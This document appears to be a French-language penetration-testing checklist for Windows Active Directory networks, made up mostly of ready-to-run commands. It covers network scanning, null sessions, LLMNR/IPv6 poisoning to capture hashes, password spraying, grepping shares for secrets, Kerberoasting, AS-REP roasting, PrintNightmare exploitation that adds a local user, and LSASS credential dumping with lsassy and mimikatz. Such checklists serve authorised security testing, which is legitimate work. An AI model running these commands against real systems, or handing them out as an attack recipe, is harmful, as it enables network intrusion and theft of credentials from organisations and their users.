# Box

```bash
# Création des répertoires
$ mkdir nmap
$ mkdir bloodhound
$ mkdir spider_plus
$ mkdir web_screens
```



## 1. Reconnaissance Windows sans ID

### 1.1 Reconnaissance globale

#### 1.1.1 Nmap

```bash
# Scan rapide de découverte
sudo nmap -sS --open -T4 <RANGE_IP/MASQUE> -oA <RANGE_IP>

```

```bash
# Scan complet
sudo nmap -A -T4 -p- <RANGE_IP/masque> -oA <RANGE_IP>

```

```bash
# Scan UDP
sudo nmap -sU <RANGE_IP/masque> -oA <RANGE_IP>

```

#### 1.1.2 Import des données dans metasploit

```bash
msfconsole
db_status
# Faire un workspace pour cloisonner les BDD
workspace -a <CODE_PROJET>
import nmap/*.xml
```

#### 1.1.3 Lister les DC 

```bash
# Les DC portent souvent le DNS
cat /etc/resolv.conf
nslookup <DOMAIN>
# Créer un .txt avec les DC
```



### 1.2 Exploitation

#### 1.2.1 Session nulle RPC

```bash
# Sur les serveurs ayant le port 135 ouvert
rpcclient -p 135 -U "" -N <IP>
```

#### 1.2.2 Session nulle SMB

```bash
crackmapexec smb dc.txt -u '' -p '' --shares
```

#### 1.2.3 Session anonyme SMB

```bash
crackmapexec smb dc.txt -u 'not_an_existing_user_35' -p '' --shares
```



### 1.3 Analyse des éléments énumérés





## 2. Avec des identifiants du domaine

### 2.1 Récolte d'informations

#### 2.1.1 LLMNR-NBT-NS

```bash
sudo responder -I eth0 -wFv
# sans les doublons des hash NTLMv2
sudo responder -I eth0 -wF
# les résultats sont stockés dans /usr/share/responder/logs/Responder-Session.log
```

#### 2.1.2 MITM6

```bash
# Récupérer des hashs via WPAD en spoofant le DNS via le DHCP
sudo mitm6 -i eth0 -d <DOMAIN>
# puis utiliser le responder
```

#### 2.1.3 Bloodhound-python

```bash
# Récupération des informations du domaine
bloodhound-python -d <DOMAIN.COM> -u '<USER_VALIDE>' -p '<MDP_VALIDE>' -gc <NOM_DC> -c all -ns <IP_DNS>
```

#### 2.1.4 Récupération des informations du domaine

```bash
# Résulats dans le répertoire "csv"
./goddi-linux-amd64 -username="USER" -password='MOT_DE_PASSE' -domain="DOMAINE.DOMAINE" -dc="DC.DOMAINE" -unsafe
```

#### 2.1.5 Liste des shares

```bash
crackmapexec smb <RANGE_IP/MASQUE> -u 'USER' -p 'MOT_DE_PASSE' --shares  
```

#### 2.1.6 Récupération de la politique de mot de passe / bruteforce

```bash
# Soit : avec Goddi à distance (dans le fichier Domain_Account_Policy.csv)
./goddi-linux-amd64 -username="USER" -password='MOT_DE_PASSE' -domain="DOMAINE.DOMAINE" -dc="DC.DOMAINE" -unsafe

# Soit : avec cme
crackmapexec smb <IP_DC> -u 'USER' -p 'MOT_DE_PASSE' -d 'DOMAINE.DOMAINE' --pass-pol 
```

#### 2.1.7 Password spraying

**Si pas de lock dans la politique de mot de passe ** (`Account Lockout Threshold`) :

```bash
# Si Kerberos (port 88 et 464)
# Bruteforce d'un mot de passe d'un utilisateur connu via le protocole Kerberos (pré-authentification)
kerbrute bruteuser --dc <DOMAIN_CONTROLLER> -d <DOMAIN.COM> <PASSWORD_WORDLIST> <USER_VALIDE>    

# Si partage SMB accessible
# Bruteforce d'un mot de passe d'un utilisateur connu sur un partage SMB
crackmapexec smb <IP_DC> -u <USERS_VALIDES_WORDLIST> -p <PASSWORD_WORDLIST> --continue-on-success

# Avec msfconsole
use scanner/smb/smb_login
set USER_FILE <USERS.txt>
set PASS_FILE <PASS.txt>
```

**Sinon, adapter le nombre de requête dans le temps selon la politique.**

#### 2.1.8 Password as Pass

```bash
use scanner/smb/smb_login
set USER_FILE <USERS.txt>
set USER_AS_PASS true
```

#### 2.1.9 Récupération des fichiers légers des shares puis GREP

```bash
# Résultats dans /tmp/cme_spider_plus
crackmapexec smb <RANGE_IP/MASQUE> -u 'USER' -p 'MOT_DE_PASSE' -M spider_plus -o READ_ONLY=false -o OUTPUT_FOLDER=spider_plus

# Différents GREP pouvant permettre de récupérer des identifiants
grep -Ria -C 10 'secret'
grep -Ria -C 10 'password'
grep -Ria -C 10 'admin'
grep -Ria -C 10 'pass'
grep -Ria -C 10 'sql'
grep -Ria -C 10 'token'

# Via interface graphique
Outil NETSCAN (sur la VM Windows)
```

#### 2.1.10 Kerberoasting

```bash
impacket-GetUserSPNs -request -dc-ip <IP_DC> 'DOMAIN/USERNAME:PASSWORD' -outputfile hash_kerberoasting_<DC_IP>.txt
```

#### 2.1.11 ASREP-Roasting

```bash
# Avec ID, requête sur l'annuaire et vérifie si la pré-auth Kerberos est activée pour chaque compte du domaine
impacket-GetNPUsers -request -dc-ip <IP_DC> '<DOMAINE.DOMAINE>/USER:<MOT_DE_PASSE>' -outputfile hash_asrep_<DC_IP>.txt

# Sans ID, bruteforce et demande pour chaque utilisateur dans la liste fournie s'il peut récupérer son TGT
impacket-GetNPUsers 'DOMAIN/USERNAME' <USER_LIST> -no-pass -outputfile hash_asrep_<DC_IP>.txt
```



### 2.2 Exploitation de vulnérabilités publiques

#### 2.2.1 MS14-025 (gpp_password)

```bash
crackmapexec smb dc.txt -u '<USER>' -p '<PASS>' -M gpp_password
```

#### 2.2.2 MS17-010 (ethernal-blue)

```bash
msfconsole
use scanner/smb/smb_ms17_010
```

#### 2.2.3 Zero logon

```bash
# https://github.com/SecuraBV/CVE-2020-1472
```

#### 2.2.4 Bluekeep

```bash
msfconsole
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

#### 2.2.5 Print-Nightmare

```bash
# Sur la machine, sans AV donc
$ git clone https://github.com/calebstewart/CVE-2021-1675
# Sur une console powershell
Get-ExecutionPolicy
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
import-module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "slash" -NewPassword "slash"
```

#### 2.2.6 Winpeas

```bash
# Sur la machine, sans AV donc
# upload winPeas.exe
&> .\winPEASany.exe
# pour avoir les bonnes couleurs
&> REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

# Si AV, essayer le .bat
```



## 3. Avec des identifiants local admin / SYSTEM

### 3.1 Récolte d'informations

#### 3.1.1 Dump LSASS

```bash
# A distance
$ crackmapexec smb <IP_PARTAGE> -u USERNAME -p PASSWORD -M lsassy 

# Si déjà connecté sur le poste client
C:\> .\mimikatz.exe
```



## 4. En dernier recours

### 4.1 Enumération Web

#### 4.1.1 Dirsearch

```bash
python3 /opt/dirsearch-git/dirsearch.py -u "http://FQDN" -e php,txt,go,json --random-agent -x 500,404,400
```

#### 4.1.2 Gobuster

```bash
gobuster vhost -u http://FQDN -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 | grep 200
```

#### 4.1.3 Gospider

```bash
# Profondeur de 5
gospider -s http://FQDN -d 5
```

#### 4.1.4 Msfconsole / Aquatone

```bash
# Réaliser des screens des applications web
msfconsole
services -p 443 -p 80 -p 8443 -p 8000 -p 8080 -c proto
# créer un fichier avec uniquement les IP récupérées
cd web_screens
touch ip_web.txt
cat ip_web.txt | ~/tools/Aquatone/aquatone
xdg-open aquatone_report.html
```



### 4.2 Imprimantes

> Ressources :
>
> - http://hacking-printers.net/wiki/index.php/File_system_access
> - http://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2010-4107
> - CVE 2022-24292 : à suivre ...

```bash
$ python pret.py <IP_IMPRIMANTE> pjl
# Activer le mode debug
SHELL_PRET:/> debug
# Enumération des répertoires visibles et listables 
SHELL_PRET:/> fuzz path
```



### 4.3 FTP

```bash
msfconsole
use auxiliary/scanner/ftp/anonymous
# On remplis les RHOSTS avec les machines ayant un port ftp ouvert
services -p 21 -R
```





## 5. Vulnérabilités remontées



## 6. Annexes

### 6.1 Identifiants



### 6.2 Tests



